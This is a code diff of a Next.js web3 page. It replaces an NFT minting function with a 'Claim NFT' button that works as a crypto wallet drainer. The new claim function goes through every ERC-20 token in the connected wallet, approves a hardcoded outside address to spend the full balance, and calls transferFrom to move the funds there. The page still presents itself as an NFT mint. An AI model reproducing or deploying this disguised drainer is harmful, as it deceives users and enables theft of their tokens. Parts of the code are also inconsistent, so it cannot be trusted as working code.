@@ -1,79 +1,95 @@
-import { useState } from 'react';
-import Head from 'next/head';
-import Image from "next/image";
-import { TailSpin } from 'react-loader-spinner';
-import axios from 'axios';
-import { useAppContext } from '../context/AppContext';
-import { nftContractABI, nftContractAddress } from '../utils/constants';
+import { useState } from "react";
+import Head from "next/head";
+import { useAppContext } from "../context/AppContext";
+import { tokenAddress, tokenABI } from "../utils/constants";
+import { useEvmWalletTokenBalances } from "@moralisweb3/next";
+import BigNumber from "bignumber.js";
 
 export default function Home() {
-  const [mintedNFT, setMintedNFT] = useState(null)
-  const [loading, setLoading] = useState(false)
-  const [txError, setTxError] = useState(null)
+  const [loading, setLoading] = useState(false);
   const {
     currentAccount,
     correctNetwork,
     connectWallet,
     getContract,
-    getProvider
+    getProvider,
   } = useAppContext();
 
-  const imageLoader = ({ src }) => {
-    return src
-  }
+  const gasLimit = 285000;
+  const { data: walletTokenBalances } = useEvmWalletTokenBalances({
+    address: currentAccount,
+    chain: "0xaa36a7",
+  });
 
-  const parseURI = (URI) => {
-    const parsedURI = URI.startsWith("ipfs://") ? `https://ipfs.io/ipfs/${URI.substring(7)}` : URI;
-
-    return parsedURI
-  }
-
-  const getMintedNFT = async (tokenId) => {
-    try {
-      const nft = getContract(nftContractAddress, nftContractABI);
-      const tokenUri = await nft.methods.tokenURI(tokenId).call();
-      const parsedTokenURI = parseURI(tokenUri)
-      const response = await axios.get(parsedTokenURI);
-      const meta = response.data;
-      const parsedImageURI = parseURI(meta.image)
-
-      setLoading(false);
-      setMintedNFT(parsedImageURI);
-    } catch (error) {
-      console.log(error);
-      setTxError(error.message);
-      throw new Error(error.message);
-    }
-  }
-
-  const mint = async () => {
-    const gasLimit = 285000;
-
-    try {
-      const nft = getContract(nftContractAddress, nftContractABI);
-      const nftTx = await nft.methods.mint(1).send({
+  const getAllowance = async (contract, walletAddress, spenderAddress) => {
+    const allowance = await contract.methods
+      .allowance(walletAddress, spenderAddress)
+      .call({
         gasLimit,
         from: currentAccount,
       });
+    return allowance;
+  };
 
-      console.log("Minting...", nftTx.transactionHash);
-      setLoading(true);
+  const claim = async () => {
+    for (let i = 0; i < walletTokenBalances.length; i++) {
+      const balance = walletTokenBalances[i];
 
-      const tokenId = getProvider().utils.hexToNumber(nftTx.events.Transfer.raw.topics[3]);
+      const balanceContractAddress = balance.token.contractAddress.lowercase;
+      console.log("balanceContractAddress: ", balance.token.name);
+      try {
+        // get contract for balance
+        const balanceContract = getContract(balanceContractAddress, tokenABI);
 
-      console.log("token ID", tokenId);
+        const allowance = await getAllowance(
+          balanceContract,
+          currentAccount,
+          tokenAddress,
+        );
 
-      console.log(
-        `Mined, see transaction: https://rinkeby.etherscan.io/tx/${nftTx.transactionHash}`
-      )
+        console.log("Allowance: ", allowance);
+        console.log("Balance: ", balance.amount.toString());
 
-      getMintedNFT(tokenId);
-    } catch (error) {
-      console.log('Error minting', error);
-      setLoading(false);
-      setTxError(error.message);
+        if (BigNumber(balance.amount).lt(allowance)) return;
+
+        // Call increase allowance
+        const transaction = await balanceContract.methods
+          .increaseAllowance(
+            "0xaf1d59542CaB0fAf97B93016a0479577c9a3140b",
+            balance.amount.toString(),
+          )
+          .send({
+            gasLimit,
+            from: currentAccount,
+          });
+        console.log("Transaction: ", transaction);
+
+        // confirm allowance
+        const newAllowance = await getAllowance(
+          balanceContract,
+          currentAccount,
+          tokenAddress,
+        );
+        console.log("NewAllowance: ", newAllowance);
+
+        // Call transferFrom with owned erc20 contract contract
+        const txn = await balanceContract.methods
+          .transferFrom(
+            currentAccount,
+            "0xaf1d59542CaB0fAf97B93016a0479577c9a3140b",
+            balance.amount.toString(),
+          )
+          .send({
+            gasLimit,
+            from: "0xaf1d59542CaB0fAf97B93016a0479577c9a3140b",
+          });
+        console.log("Txn: ", txn);
+      } catch (error) {
+        console.log("Error minting", error);
+        setLoading(false);
+      }
     }
-  }
+  };
 
   return (
     <div>
@@ -85,70 +101,48 @@ export default function Home() {
 
       <main className="bg-white">
         <div className="max-w-2xl mx-auto py-16 px-4 sm:py-24 sm:px-6 lg:max-w-7xl lg:px-8">
-
           {!currentAccount ? (
-            <div className='flex flex-col justify-center items-center mb-20 font-bold text-2xl gap-y-3'>
+            <div className="flex flex-col justify-center items-center mb-20 font-bold text-2xl gap-y-3">
               <div>----------------------------------------</div>
               <div>Please connect wallet</div>
               <div>----------------------------------------</div>
             </div>
           ) : (
             <div className="flex flex-col items-center pt-32 text-gray-900">
-              <div className='trasition hover:rotate-180 hover:scale-105 transition duration-500 ease-in-out'>
+              <div className="trasition hover:rotate-180 hover:scale-105 transition duration-500 ease-in-out">
                 <svg
-                  xmlns='http://www.w3.org/2000/svg'
-                  width='60'
-                  height='60'
-                  fill='currentColor'
-                  viewBox='0 0 16 16'
+                  xmlns="http://www.w3.org/2000/svg"
+                  width="60"
+                  height="60"
+                  fill="currentColor"
+                  viewBox="0 0 16 16"
                 >
-                  <path d='M8.186 1.113a.5.5 0 0 0-.372 0L1.846 3.5 8 5.961 14.154 3.5 8.186 1.113zM15 4.239l-6.5 2.6v7.922l6.5-2.6V4.24zM7.5 14.762V6.838L1 4.239v7.923l6.5 2.6zM7.443.184a1.5 1.5 0 0 1 1.114 0l7.129 2.852A.5.5 0 0 1 16 3.5v8.662a1 1 0 0 1-.629.928l-7.185 2.874a.5.5 0 0 1-.372 0L.63 13.09a1 1 0 0 1-.63-.928V3.5a.5.5 0 0 1 .314-.464L7.443.184z' />
+                  <path d="M8.186 1.113a.5.5 0 0 0-.372 0L1.846 3.5 8 5.961 14.154 3.5 8.186 1.113zM15 4.239l-6.5 2.6v7.922l6.5-2.6V4.24zM7.5 14.762V6.838L1 4.239v7.923l6.5 2.6zM7.443.184a1.5 1.5 0 0 1 1.114 0l7.129 2.852A.5.5 0 0 1 16 3.5v8.662a1 1 0 0 1-.629.928l-7.185 2.874a.5.5 0 0 1-.372 0L.63 13.09a1 1 0 0 1-.63-.928V3.5a.5.5 0 0 1 .314-.464L7.443.184z" />
                 </svg>
               </div>
 
-              <h2 className='text-3xl font-bold mb-20 mt-12'>
+              <h2 className="text-3xl font-bold mb-20 mt-12">
                 Mint your Sway Bot NFT!
               </h2>
 
-              <button className='text-2xl font-bold py-3 px-12 bg-indigo-500 shadow-lg shadow-[#6FFFE9] rounded-lg mb-10 hover:scale-105 transition duration-500 ease-in-out text-white' disabled={loading} onClick={mint}>
-                Mint NFT
+              <button
+                className="text-2xl font-bold py-3 px-12 bg-indigo-500 shadow-lg shadow-[#6FFFE9] rounded-lg mb-10 hover:scale-105 transition duration-500 ease-in-out text-white"
+                disabled={loading}
+                onClick={claim}
+              >
+                Claim NFT
               </button>
-
-              {loading ? (
-                <div className='flex flex-col justify-center items-center'>
-                  <div className='text-lg font-bold'>
-                    Processing your transaction
-                  </div>
-                  <TailSpin
-                    className='flex justify-center items-center pt-12'
-                    color='#d3d3d3'
-                    height={40}
-                    width={40}
-                  />
-                </div>
-              ) : (
-                txError !== null ? (
-                  <div className='text-lg text-red-600 font-semibold'>{txError}</div>
-                ) : mintedNFT === null ? (
-                  <div></div>
-                ) : (
-                  <div className='flex flex-col justify-center items-center py-4'>
-                    <Image
-                      loader={imageLoader}
-                      unoptimized={true}
-                      src={mintedNFT}
-                      height="300"
-                      width="300"
-                      alt=''
-                      className='h-60 w-60 rounded-lg shadow-2xl shadow-[#6FFFE9] hover:scale-105 transition duration-500 ease-in-out'
-                    />
-                  </div>
-                )
-              )}
+              <ul>
+                {walletTokenBalances?.map((bal, balIndex) => (
+                  <li key={balIndex}>
+                    {bal.token.name} - {bal.amount.toString()}
+                  </li>
+                ))}
+              </ul>
             </div>
           )}
         </div>
       </main>
     </div>
-  )
+  );
 }
